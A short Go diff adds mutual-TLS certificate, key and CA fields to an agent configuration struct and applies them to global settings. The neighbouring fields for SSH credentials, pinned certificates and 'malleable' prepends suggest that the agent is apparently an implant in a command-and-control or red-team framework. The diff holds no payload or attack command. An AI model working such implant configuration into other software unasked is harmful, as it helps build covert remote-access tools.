@@ -262,6 +262,9 @@ type agentConfigBlob struct {
 	SSHPassword      string `json:"ssh_password"`
 	SSHKey           string `json:"ssh_key"`
 	SSHHostKey       string `json:"ssh_host_key"`
+	MTLSCert         string `json:"mtls_cert"`
+	MTLSKey          string `json:"mtls_key"`
+	MTLSCA           string `json:"mtls_ca"`
 	PinnedCertSHA256 string `json:"pinned_cert"`
 	SelfCheckSHA256  string `json:"self_check"`
 	MalleablePrepend string `json:"malleable_prepend"`
@@ -578,6 +581,15 @@ func (b *agentConfigBlob) apply() {
 	}
 	if b.SSHHostKey != "" {
 		SSHHostKeyStr = b.SSHHostKey
+	}
+	if b.MTLSCert != "" {
+		MTLSCertStr = b.MTLSCert
+	}
+	if b.MTLSKey != "" {
+		MTLSKeyStr = b.MTLSKey
+	}
+	if b.MTLSCA != "" {
+		MTLSCAStr = b.MTLSCA
 	}
 	if b.PinnedCertSHA256 != "" {
 		PinnedCertSHA256Str = b.PinnedCertSHA256
